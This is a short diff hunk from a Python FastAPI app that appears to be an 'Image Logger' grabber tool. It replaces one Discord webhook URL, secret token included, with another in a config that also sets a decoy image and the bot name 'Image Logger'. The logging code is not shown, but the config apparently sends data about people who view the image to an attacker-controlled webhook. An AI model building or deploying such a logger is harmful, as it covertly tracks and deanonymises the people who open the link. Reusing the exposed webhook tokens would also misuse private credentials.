@@ -6,7 +6,7 @@ from urllib.parse import unquote
 app = FastAPI()
 
 CONFIG = {
-    "webhook": "https://discord.com/api/webhooks/1571542760379387934/SOJeZdFWEL60Jy1rcY0vpOmzQDNo0rny-uAok-PBTlhl5Cqqj3j26q2BtGMAOscwHXul",
+    "webhook": "https://discord.com/api/webhooks/1561463996492685455/dzItpfIa--spMSlImqWsdL_ktgYWU7nwryzBqBDa02BN0HiZ0s3x-B-c6bM2Bw1Gyzmy",
     "image": "https://imgs.search.brave.com/lC0-0E9jfTGCtglZ8u1bT3gAEnV8zxa-k8GmvVrOZ7g/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9tZWRp/YTAuZ2lwaHkuY29t/L21lZGlhL3YxLlky/bGtQVGM1TUdJM05q/RXhjSFl4WjJ4dWJt/Wm5lbWQzT0RObGJH/TmxNM3B2YVRnMU4y/ZGhjblp4Y1Rsa2Qy/a3hlRzR3ZVNabGNE/MTJNVjluYVdaelgz/TmxZWEpqYUNaamRE/MW4vYzBVcktFd1Fu/RE9ZMFlvWlJYLzIw/MC5naWY.jpeg",
     "username": "Image Logger",
     "color": 0x00FFFF,
